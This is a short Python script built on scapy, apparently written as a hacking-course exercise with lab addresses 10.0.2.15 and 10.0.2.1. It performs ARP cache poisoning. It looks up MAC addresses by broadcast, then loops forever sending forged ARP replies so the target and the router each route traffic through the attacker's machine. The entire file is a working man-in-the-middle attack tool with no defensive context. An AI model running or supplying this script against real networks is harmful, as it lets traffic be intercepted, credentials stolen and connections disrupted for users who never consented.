#!/usr/bin/env python

import scapy.all as scapy
import time

target_ip = "10.0.2.15"
target_mac = "08:00:27:70:92:1d"
router_ip = "10.0.2.1"


def get_mac(ip):
    # create a packet with desired ip range
    arp_request = scapy.ARP(pdst=ip)

    # create an Internet frame to broadcast packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # concatenate the 2 packets
    arp_request_broadcast = broadcast/arp_request

    # send and receive packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # return mac address of target ip
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet)


while True:
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
    time.sleep(2)